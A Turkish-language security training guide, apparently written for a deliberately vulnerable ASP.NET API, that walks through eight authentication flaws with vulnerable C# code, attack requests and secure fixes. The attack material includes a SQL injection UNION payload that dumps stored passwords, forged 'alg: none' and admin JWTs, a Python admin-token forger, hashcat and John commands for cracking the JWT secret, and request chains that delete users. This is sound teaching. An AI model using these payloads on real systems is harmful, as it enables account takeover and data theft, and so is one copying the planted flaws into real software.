# ?? AuthController Güvenlik Zafiyetleri Rehberi

## ?? UYARI
Bu döküman **EÐÝTÝM AMAÇLIDIR**. Burada anlatýlan teknikler yalnýzca sahip olduðunuz veya test etme izniniz olan sistemlerde kullanýlmalýdýr.

---

## ?? Ýçindekiler
1. [Zayýf Þifre Politikasý](#1-zayýf-þifre-politikasý)
2. [Düz Metin Þifre Saklama](#2-düz-metin-þifre-saklama)
3. [Hardcoded JWT Secret Key](#3-hardcoded-jwt-secret-key)
4. [JWT Token Manipülasyonu](#4-jwt-token-manipülasyonu)
5. [Aþýrý Uzun Token Süresi](#5-aþýrý-uzun-token-süresi)
6. [Hassas Veri Loglama](#6-hassas-veri-loglama)
7. [Secret Key Ýfþasý](#7-secret-key-ifþasý)
8. [Yetkisiz Token Üretimi](#8-yetkisiz-token-üretimi)

---

## 1. Zayýf Þifre Politikasý

### ?? Zafiyet Kodu (Register Endpoint)

```csharp
[HttpPost("register")]
public async Task<IActionResult> Register([FromBody] RegisterRequest request)
{
    // ? ZAFIYET: Þifre gücü kontrolü YOK
    // "12345", "password", "123" gibi zayýf þifreler kabul ediliyor
    
    var user = new User
    {
        Username = request.Username,
  Password = request.Password,  // ? Hiçbir kontrol yapýlmadan kaydediliyor
        // ...
    };
}
```

### ?? Saldýrý Senaryosu

```bash
POST /api/auth/register
Content-Type: application/json

{
"username": "test_user",
  "email": "test@example.com",
  "password": "1",         # ? 1 karakterlik þifre kabul ediliyor!
  "fullName": "Test User"
}
```

**Sonuç:** ? Baþarýlý! Kullanýcý "1" þifresiyle kaydedildi.

### ??? Güvenli Versiyon

```csharp
[HttpPost("register")]
public async Task<IActionResult> Register([FromBody] RegisterRequest request)
{
    // ? Þifre gücü kontrolü
    if (request.Password.Length < 8)
        return BadRequest("Þifre en az 8 karakter olmalýdýr");
  
    if (!request.Password.Any(char.IsUpper))
    return BadRequest("Þifre en az 1 büyük harf içermelidir");
    
    if (!request.Password.Any(char.IsDigit))
        return BadRequest("Þifre en az 1 rakam içermelidir");
    
    if (!request.Password.Any(c => !char.IsLetterOrDigit(c)))
  return BadRequest("Þifre en az 1 özel karakter içermelidir");
    
    // ? Þifreyi hashle
    var passwordHash = BCrypt.Net.BCrypt.HashPassword(request.Password);
    
    var user = new User
    {
        Username = request.Username,
  Password = passwordHash,  // ? Hash'lenmiþ þifre
        // ...
    };
}
```

### ?? OWASP API Security Top 10
- **API2:2023** - Broken Authentication

---

## 2. Düz Metin Þifre Saklama

### ?? Zafiyet Kodu

```csharp
var user = new User
{
    Username = request.Username,
    Password = request.Password,  // ? Düz metin olarak kaydediliyor!
 // ...
};

_context.Users.Add(user);
await _context.SaveChangesAsync();

// Veritabanýnda:
// | Id | Username | Password  |
// |----|----------|-----------|
// | 1  | admin    | admin123  |  ? Okunabilir!
// | 2  | john     | 12345     |  ? Okunabilir!
```

### ?? Saldýrý Senaryosu

**Senaryo 1: SQL Injection ile Þifreleri Çalma**
```sql
' UNION SELECT "Id", "Username", "Password", "Email", 0, "PhoneNumber", "CreatedAt" FROM "Users"--
```

**Sonuç:**
```json
[
  {
    "id": 1,
    "name": "admin",
    "description": "admin123",  // ?? Þifre düz metin!
    "price": "admin@vulnerable.api"
  }
]
```

**Senaryo 2: IDOR ile Kullanýcý Bilgilerini Görme**
```bash
GET /api/user/1
Authorization: Bearer {any_valid_token}
```

**Sonuç:**
```json
{
  "id": 1,
  "username": "admin",
  "password": "admin123",  // ?? Þifre açýkta!
  "creditCardNumber": "4532-1234-5678-9010"
}
```

### ??? Güvenli Versiyon

```csharp
// ? BCrypt kullanarak þifre hashleme
using BCrypt.Net;

var user = new User
{
    Username = request.Username,
    Password = BCrypt.Net.BCrypt.HashPassword(request.Password),  // ? Hash
    // ...
};

// Veritabanýnda:
// | Id | Username | Password                |
// |----|----------|-------------------------------------------------------|
// | 1  | admin    | $2a$11$8xV7YvZj7pZf8T6K5Y9.EeYqT9pV3nH8x4K5Y9.EeYqT9pV |
```

**Login kontrolü:**
```csharp
// ? Hash karþýlaþtýrmasý
if (!BCrypt.Net.BCrypt.Verify(request.Password, user.Password))
{
    return Unauthorized("Geçersiz þifre");
}
```

### ?? OWASP API Security Top 10
- **API2:2023** - Broken Authentication
- **A02:2021** - Cryptographic Failures

---

## 3. Hardcoded JWT Secret Key

### ?? Zafiyet Kodu (Login Endpoint)

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // ? ZAFIYET: Hardcoded secret key
    var secretKey = "ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!";
    var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
    
    // Token oluþturma...
}
```

### ?? Saldýrý Senaryosu

**Adým 1: Kaynak koddan secret key'i bul**
```bash
# GitHub, GitLab gibi public repo'larda arama
grep -r "ThisIsAHardcoded" .
```

**Adým 2: jwt.io'da admin token oluþtur**
```
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "nameid": "999",
  "unique_name": "hacker",
  "role": "Admin"
}

Secret Key:
ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!
```

**Adým 3: Oluþturulan token ile tüm admin endpoint'lere eriþ**
```bash
GET /api/user/1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

?? **Baþarýlý!** Admin yetkilerine sahipsin!

### ??? Güvenli Versiyon

```csharp
// appsettings.json
{
  "Jwt": {
    "SecretKey": "Bu deðer Azure Key Vault'tan alýnmalý!",
    "Issuer": "VulnerableAPI",
    "Audience": "VulnerableAPI"
  }
}

// Program.cs veya AuthController
var secretKey = builder.Configuration["Jwt:SecretKey"];  // ? Config'den al

// Daha güvenli: Azure Key Vault
var keyVaultClient = new SecretClient(new Uri(keyVaultUrl), new DefaultAzureCredential());
var secret = await keyVaultClient.GetSecretAsync("jwt-secret-key");
var secretKey = secret.Value.Value;
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A02:2021** - Cryptographic Failures

---

## 4. JWT Token Manipülasyonu

### ?? Zafiyet: Token Decode Endpoint

```csharp
[HttpPost("decode-token")]
public IActionResult DecodeToken([FromBody] TokenDecodeRequest request)
{
    // ? ZAFIYET: Token yapýsýný tamamen açýða çýkarýyor
    var handler = new JwtSecurityTokenHandler();
    var token = handler.ReadJwtToken(request.Token);
    
    return Ok(new
    {
     header = token.Header,   // ? Algoritma bilgisi
     payload = token.Claims,       // ? Tüm claim'ler
        signature = request.Token.Split('.').LastOrDefault(),  // ? Signature
        vulnerabilityHints = new          // ? Saldýrý ipuçlarý!
        {
         secretKeyPattern = "ThisIsA...123!",
            attackVectors = new[] { /* ... */ }
        }
    });
}
```

### ?? Saldýrý Senaryosu 1: Algorithm Confusion (alg: none)

**Adým 1: Normal kullanýcý olarak login ol**
```bash
POST /api/auth/login
{
  "username": "john",
  "password": "12345"
}
```

**Yanýt:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIyIiwidW5pcXVlX25hbWUiOiJqb2huIiwicm9sZSI6IlVzZXIifQ.signature"
}
```

**Adým 2: Token'ý decode et**
```bash
POST /api/auth/decode-token
{
  "token": "eyJhbG..."
}
```

**Adým 3: jwt.io'da token'ý deðiþtir**

**Orijinal Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Deðiþtirilmiþ Header:**
```json
{
  "alg": "none",  // ? Algoritma "none" yapýldý
  "typ": "JWT"
}
```

**Deðiþtirilmiþ Payload:**
```json
{
  "nameid": "2",
  "unique_name": "john",
  "role": "Admin"  // ? User'dan Admin'e deðiþtirildi
}
```

**Yeni Token (signature olmadan):**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1laWQiOiIyIiwidW5pcXVlX25hbWUiOiJqb2huIiwicm9sZSI6IkFkbWluIn0.
```
(Not: Sondaki nokta önemli!)

**Adým 4: Deðiþtirilmiþ token'la admin endpoint'e eriþ**
```bash
GET /api/auth/verify
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
```

?? **Not:** Bu saldýrý, signature doðrulamasý zayýfsa çalýþýr.

### ?? Saldýrý Senaryosu 2: Token Manipulation Helper Kullanýmý

```bash
# Token yapýsýný görüntüle
POST /api/auth/decode-token
{
"token": "eyJhbGciOiJIUzI1..."
}
```

**Yanýt:**
```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "userId": "2",
    "username": "john",
    "role": "User"
  },
  "vulnerabilityHints": {
    "secretKeyPattern": "ThisIsA...123!",
    "attackVectors": [
    "1. Try changing 'alg' to 'none' and remove signature",
      "2. Brute force the weak secret key",
      "3. Modify the 'role' claim from 'User' to 'Admin'"
    ]
  }
}
```

### ??? Güvenli Versiyon

```csharp
// ? Bu endpoint hiç olmamalý!
// [HttpPost("decode-token")]
// public IActionResult DecodeToken() { }

// ? Sadece server-side doðrulama
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuerSigningKey = true,
    ValidateIssuer = true,
    ValidateAudience = true,
    ValidateLifetime = true,
    ValidAlgorithms = new[] { SecurityAlgorithms.HmacSha256 },  // ? Sadece HS256
    RequireSignedTokens = true,  // ? Signature zorunlu
    IssuerSigningKey = key
};
```

### ?? OWASP API Security Top 10
- **API2:2023** - Broken Authentication
- **API8:2023** - Security Misconfiguration

---

## 5. Aþýrý Uzun Token Süresi

### ?? Zafiyet Kodu

```csharp
var token = new JwtSecurityToken(
    issuer: "VulnerableAPI",
    audience: "VulnerableAPI",
 claims: claims,
    expires: DateTime.UtcNow.AddDays(365),  // ? 1 yýl geçerli!
    signingCredentials: credentials
);
```

### ?? Saldýrý Senaryosu

**Senaryo: Token Çalýndý**

1. Saldýrgan bir þekilde user token'ýný ele geçiriyor (XSS, Man-in-the-Middle, vb.)
2. Token **1 yýl boyunca** geçerli olduðu için saldýrgan:
   - Kullanýcý þifresini deðiþtirse bile token geçerli
   - Kullanýcý logout olsa bile token geçerli
   - Kullanýcý hesabýný silse bile token geçerli (DB kontrolü yoksa)

```bash
# Bugün çalýnan token
GET /api/user/2
Authorization: Bearer {stolen_token}
# ? Çalýþýr

# 6 ay sonra ayný token
GET /api/user/2
Authorization: Bearer {stolen_token}
# ? Hala çalýþýr!

# 364 gün sonra
GET /api/user/2
Authorization: Bearer {stolen_token}
# ? Hala çalýþýr!
```

### ??? Güvenli Versiyon

```csharp
// ? Kýsa süreli access token (15 dakika)
var accessToken = new JwtSecurityToken(
    issuer: "VulnerableAPI",
  audience: "VulnerableAPI",
 claims: claims,
    expires: DateTime.UtcNow.AddMinutes(15),  // ? 15 dakika
    signingCredentials: credentials
);

// ? Refresh token (7 gün) - Sadece token yenilemek için
var refreshToken = new JwtSecurityToken(
    issuer: "VulnerableAPI",
    audience: "VulnerableAPI",
    claims: new[] { new Claim("type", "refresh") },
    expires: DateTime.UtcNow.AddDays(7),
    signingCredentials: credentials
);

// ? Token revocation sistemi
// Token'larý bir blacklist'te tut veya Redis'te sakla
```

**Program.cs'de:**
```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateLifetime = true,  // ? Token süresini kontrol et
    ClockSkew = TimeSpan.Zero  // ? Ekstra süre verme
};
```

### ?? OWASP API Security Top 10
- **API2:2023** - Broken Authentication

---

## 6. Hassas Veri Loglama

### ?? Zafiyet Kodu

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // ? ZAFIYET: Þifre loglanýyor!
  Console.WriteLine($"Login attempt - Username: {request.Username}, Password: {request.Password}");
    _logger.LogInformation("User login attempt: {Username} with password: {Password}", 
    request.Username, request.Password);
    
    // ...
    
    // ? ZAFIYET: Token loglanýyor!
    Console.WriteLine($"Generated JWT token for user {user.Username}: {tokenString}");
    _logger.LogInformation("JWT Token generated: {Token}", tokenString);
}
```

### ?? Saldýrý Senaryosu

**Senaryo 1: Log Dosyasýna Eriþim**

Saldýrgan log dosyalarýna eriþirse:

```
[2024-02-15 10:30:15] INFO: User login attempt: admin with password: admin123
[2024-02-15 10:30:15] INFO: JWT Token generated: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
[2024-02-15 10:35:22] INFO: User login attempt: john with password: 12345
[2024-02-15 10:35:22] INFO: JWT Token generated: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Sonuç:** 
- ?? Tüm kullanýcý þifreleri açýkta!
- ?? Aktif token'lar ele geçirildi!

**Senaryo 2: Console Output**

```bash
# Uygulama console'da çalýþýyorsa
docker logs vulnerable-api

Login attempt - Username: admin, Password: admin123
Generated JWT token for user admin: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### ??? Güvenli Versiyon

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // ? Sadece username logla, þifre ASLA
    _logger.LogInformation("Login attempt for username: {Username}", request.Username);
    
    var user = await AuthenticateUser(request.Username, request.Password);
    
    if (user == null)
    {
        // ? Baþarýsýz giriþim logla (brute force tespiti için)
  _logger.LogWarning("Failed login attempt for username: {Username} from IP: {IP}", 
      request.Username, HttpContext.Connection.RemoteIpAddress);
        return Unauthorized();
    }
    
    var tokenString = GenerateToken(user);
    
    // ? Token ID'sini logla, token'ýn kendisini deðil
    var tokenId = Guid.NewGuid();
    _logger.LogInformation("Token {TokenId} generated for user: {Username}", 
        tokenId, user.Username);
    
    return Ok(new { token = tokenString });
}
```

**Log çýktýsý (güvenli):**
```
[2024-02-15 10:30:15] INFO: Login attempt for username: admin
[2024-02-15 10:30:15] INFO: Token a3f5c2d1-... generated for user: admin
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A09:2021** - Security Logging and Monitoring Failures

---

## 7. Secret Key Ýfþasý

### ?? Zafiyet Kodu

```csharp
[HttpGet("secret-key")]
public IActionResult GetSecretKey()
{
    // ? ZAFIYET: Secret key API üzerinden açýða çýkýyor!
    return Ok(new
    {
        secretKey = "ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!",
        algorithm = "HS256",
        howToExploit = new[]
        {
       "1. Use this secret key with jwt.io to create/modify tokens",
   "2. Change any user's role from 'User' to 'Admin'",
        "3. Create tokens for any user ID"
   }
    });
}
```

### ?? Saldýrý Senaryosu

**Adým 1: Secret key'i al**
```bash
GET /api/auth/secret-key
```

**Yanýt:**
```json
{
  "secretKey": "ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!",
  "algorithm": "HS256",
  "warning": "Never expose your secret key in production!",
  "howToExploit": [
"1. Use this secret key with jwt.io to create/modify tokens",
    "2. Change any user's role from 'User' to 'Admin'",
    "3. Create tokens for any user ID",
    "4. Bypass all authorization checks"
  ]
}
```

**Adým 2: jwt.io'da admin token oluþtur**

```
HEADER:
{
  "alg": "HS256",
  "typ": "JWT"
}

PAYLOAD:
{
  "nameid": "999",
  "unique_name": "super_hacker",
  "role": "Admin",
  "exp": 2071171513
}

VERIFY SIGNATURE:
ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!
```

**Adým 3: Oluþturulan token'la tüm API'yi kontrol et**
```bash
# Tüm kullanýcýlarý sil
DELETE /api/user/1
DELETE /api/user/2
DELETE /api/user/3

# Yeni admin hesabý oluþtur
POST /api/auth/register
{
  "username": "backdoor_admin",
  "password": "secret123",
  "email": "hacker@evil.com"
}

# Kendini admin yap
PUT /api/user/4
{
  "isAdmin": true
}
```

?? **Oyun bitti!** Saldýrgan artýk sistemin tamamýný kontrol ediyor.

### ??? Güvenli Versiyon

```csharp
// ? Bu endpoint HÝÇBÝR ZAMAN olmamalý!
// [HttpGet("secret-key")]
// public IActionResult GetSecretKey() { }

// ? Secret key'ler ASLA API'den dönülmemeli
// ? Azure Key Vault, AWS Secrets Manager, HashiCorp Vault kullan
// ? Environment variables veya secure configuration
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A02:2021** - Cryptographic Failures

---

## 8. Yetkisiz Token Üretimi

### ?? Zafiyet Kodu

```csharp
[HttpPost("generate-token")]
public IActionResult GenerateCustomToken([FromBody] CustomTokenRequest request)
{
    // ? ZAFIYET: Authentication gerektirmiyor!
    // ? ZAFIYET: Herhangi bir role ile token üretebiliyor!
    
    var secretKey = "ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!";
    var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
    var credentials = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

    var claims = new[]
    {
     new Claim(ClaimTypes.NameIdentifier, request.UserId.ToString()),
        new Claim(ClaimTypes.Name, request.Username),
        new Claim(ClaimTypes.Role, request.Role)  // ? Hiçbir kontrol yok!
    };

    var token = new JwtSecurityToken(
        issuer: "VulnerableAPI",
        audience: "VulnerableAPI",
claims: claims,
        expires: DateTime.UtcNow.AddDays(365),
  signingCredentials: credentials
    );

return Ok(new { token = tokenString });
}
```

### ?? Saldýrý Senaryosu

**Instant Admin Access:**

```bash
# Hiçbir kimlik doðrulama olmadan admin token oluþtur!
POST /api/auth/generate-token
Content-Type: application/json

{
  "userId": 9999,
  "username": "instant_admin",
  "role": "Admin"
}
```

**Yanýt:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiI5OTk5IiwidW5pcXVlX25hbWUiOiJpbnN0YW50X2FkbWluIiwicm9sZSI6IkFkbWluIn0...",
  "userId": 9999,
  "username": "instant_admin",
  "role": "Admin",
  "warning": "This endpoint should never exist in production!"
}
```

**Token'ý kullan:**
```bash
GET /api/auth/verify
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Yanýt:**
```json
{
  "userId": "9999",
  "username": "instant_admin",
  "role": "Admin",  // ? Admin!
  "message": "Token is valid"
}
```

?? **Sonuç:** Veritabanýnda hesabý olmayan bir kullanýcý, anýnda admin yetkilerine sahip oldu!

### ??? Güvenli Versiyon

```csharp
// ? Bu endpoint HÝÇBÝR ZAMAN olmamalý!
// Token üretimi SADECE authentication sonrasý yapýlmalý

[HttpPost("login")]
[AllowAnonymous]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
// ? Önce kullanýcýyý doðrula
  var user = await AuthenticateUser(request.Username, request.Password);
    if (user == null)
        return Unauthorized();
    
    // ? Kullanýcýnýn gerçek bilgilerinden token oluþtur
    var claims = new[]
    {
    new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
        new Claim(ClaimTypes.Name, user.Username),
        new Claim(ClaimTypes.Role, user.IsAdmin ? "Admin" : "User")  // ? DB'den
    };
    
    // Token oluþtur ve döndür
}

// ? Refresh token endpoint (sadece geçerli token ile)
[HttpPost("refresh-token")]
[Authorize]  // ? Authentication gerekli
public async Task<IActionResult> RefreshToken()
{
  var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    var user = await _context.Users.FindAsync(int.Parse(userId));
 
    // Yeni token oluþtur (ayný claims ile)
}
```

### ?? OWASP API Security Top 10
- **API2:2023** - Broken Authentication
- **API1:2023** - Broken Object Level Authorization

---

## ?? Tüm Zafiyetlerin Özeti

| # | Zafiyet | Endpoint | Tehlike Seviyesi | OWASP |
|---|---------|----------|------------------|-------|
| 1 | Zayýf Þifre Politikasý | `POST /register` | ?? Orta | API2:2023 |
| 2 | Düz Metin Þifre | `POST /register` | ?? Kritik | API2:2023 |
| 3 | Hardcoded Secret Key | `POST /login` | ?? Kritik | API8:2023 |
| 4 | Token Manipulation | `POST /decode-token` | ?? Kritik | API2:2023 |
| 5 | Aþýrý Token Süresi | `POST /login` | ?? Orta | API2:2023 |
| 6 | Hassas Veri Loglama | Tüm endpoint'ler | ?? Düþük | API8:2023 |
| 7 | Secret Key Ýfþasý | `GET /secret-key` | ?? Kritik | API8:2023 |
| 8 | Yetkisiz Token Üretimi | `POST /generate-token` | ?? Kritik | API2:2023 |

---

## ??? Saldýrý Araçlarý

### 1. JWT Manipülasyon Araçlarý
- **[jwt.io](https://jwt.io)** - Online JWT decoder/encoder
- **[jwt_tool](https://github.com/ticarpi/jwt_tool)** - Otomatik JWT saldýrý aracý
- **Burp Suite JWT Editor** - Token intercepting ve modifying

### 2. Brute Force Araçlarý
```bash
# Hashcat ile JWT secret brute force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --format=HMAC-SHA256 --wordlist=wordlist.txt jwt_hash.txt
```

### 3. Python Script - Admin Token Üretme
```python
import jwt
from datetime import datetime, timedelta

secret = "ThisIsAHardcodedSecretKeyThatIsVeryInsecure123!"
payload = {
 "nameid": "999",
    "unique_name": "hacker",
    "role": "Admin",
    "exp": datetime.utcnow() + timedelta(days=365)
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Admin Token: {token}")
```

---

## ?? Pratik Yapma Senaryolarý

### Senaryo 1: Sýfýrdan Admin Olma

```bash
# 1. Secret key'i al
GET /api/auth/secret-key

# 2. Admin token üret
POST /api/auth/generate-token
{
  "userId": 1000,
  "username": "new_admin",
  "role": "Admin"
}

# 3. Token'la tüm kullanýcýlarý listele
GET /api/user
Authorization: Bearer {admin_token}

# 4. Baþka bir kullanýcýnýn bilgilerini deðiþtir
PUT /api/user/2
Authorization: Bearer {admin_token}
{
  "isAdmin": false,
  "password": "hacked123"
}
```

### Senaryo 2: Token Manipulation

```bash
# 1. Normal kullanýcý olarak login
POST /api/auth/login
{"username": "john", "password": "12345"}

# 2. Token'ý decode et
POST /api/auth/decode-token
{"token": "eyJhbG..."}

# 3. jwt.io'da role'ü Admin'e çevir

# 4. Yeni token'la admin iþlemleri yap
DELETE /api/user/1
```

### Senaryo 3: SQL Injection + Token Manipulation

```bash
# 1. SQL Injection ile admin þifresini al
GET /api/product/search?keyword=' UNION SELECT "Id", "Username", "Password", "Email", 0, 0, "CreatedAt" FROM "Users"--

# 2. Admin olarak login ol
POST /api/auth/login
{"username": "admin", "password": "admin123"}

# 3. Tüm sistemi kontrol et!
```

---

## ?? Güvenli Kod Örnekleri

### Tam Güvenli AuthController

```csharp
[ApiController]
[Route("api/[controller]")]
public class SecureAuthController : ControllerBase
{
    private readonly UserManager<ApplicationUser> _userManager;
    private readonly SignInManager<ApplicationUser> _signInManager;
    private readonly IConfiguration _configuration;

    [HttpPost("register")]
  [AllowAnonymous]
 public async Task<IActionResult> Register([FromBody] RegisterRequest request)
    {
        // ? Þifre politikasý kontrolü
   var passwordValidator = new PasswordValidator<ApplicationUser>();
        var result = await passwordValidator.ValidateAsync(_userManager, null, request.Password);
        
  if (!result.Succeeded)
         return BadRequest(result.Errors);

        // ? Kullanýcý oluþtur (Identity ile hash'lenir)
        var user = new ApplicationUser
   {
            UserName = request.Username,
            Email = request.Email
        };

        var createResult = await _userManager.CreateAsync(user, request.Password);
   
        if (!createResult.Succeeded)
return BadRequest(createResult.Errors);

        return Ok(new { message = "Kayýt baþarýlý" });
    }

    [HttpPost("login")]
    [AllowAnonymous]
    public async Task<IActionResult> Login([FromBody] LoginRequest request)
    {
        // ? Güvenli authentication
        var result = await _signInManager.PasswordSignInAsync(
            request.Username, 
       request.Password, 
        isPersistent: false, 
  lockoutOnFailure: true  // ? Brute force korumasý
   );

        if (!result.Succeeded)
        {
    _logger.LogWarning("Failed login for {Username}", request.Username);
            return Unauthorized();
    }

        var user = await _userManager.FindByNameAsync(request.Username);
     var roles = await _userManager.GetRolesAsync(user);

  // ? Güvenli secret key
        var secret = _configuration["Jwt:SecretKey"];
     var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secret));

        var claims = new List<Claim>
        {
      new Claim(ClaimTypes.NameIdentifier, user.Id),
     new Claim(ClaimTypes.Name, user.UserName),
   new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
        };
        
        claims.AddRange(roles.Select(role => new Claim(ClaimTypes.Role, role)));

  // ? Kýsa süreli token (15 dk)
  var token = new JwtSecurityToken(
         issuer: _configuration["Jwt:Issuer"],
            audience: _configuration["Jwt:Audience"],
      claims: claims,
         expires: DateTime.UtcNow.AddMinutes(15),  // ? 15 dakika
      signingCredentials: new SigningCredentials(key, SecurityAlgorithms.HmacSha256)
        );

        // ? Sadece token döndür, log'lama
        _logger.LogInformation("User {Username} logged in", user.UserName);

return Ok(new { token = new JwtSecurityTokenHandler().WriteToken(token) });
    }
}
```

---

## ?? Kaynaklar

### Öðrenme Kaynaklarý
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [JWT.io Introduction](https://jwt.io/introduction)
- [Microsoft ASP.NET Core Security](https://docs.microsoft.com/en-us/aspnet/core/security/)

### Güvenlik Test Araçlarý
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Postman](https://www.postman.com/)

### Güvenli Kütüphaneler
- [BCrypt.Net](https://github.com/BcryptNet/bcrypt.net)
- [ASP.NET Core Identity](https://docs.microsoft.com/en-us/aspnet/core/security/authentication/identity)
- [Azure Key Vault](https://azure.microsoft.com/en-us/services/key-vault/)

---

## ?? Son Uyarý

Bu döküman **sadece eðitim amaçlýdýr**. Burada gösterilen tüm zafiyetler **kasýtlý olarak** oluþturulmuþtur. 

**ASLA:**
- ? Baþkasýna ait sistemlerde test yapma
- ? Ýzin almadan güvenlik testi yapma
- ? Bu kodu production'da kullanma
- ? Öðrendiklerini kötüye kullanma

**HER ZAMAN:**
- ? Etik kurallara uy
- ? Kendi test ortamýnda çalýþ
- ? Güvenlik açýklarýný sorumlu þekilde bildir
- ? Güvenlik best practice'lerini uygula

---

**Hazýrlayan:** Security Education Team  
**Versiyon:** 1.0  
**Tarih:** 2024  
**Amaç:** Eðitim

?? **Güvenli kodlama!**
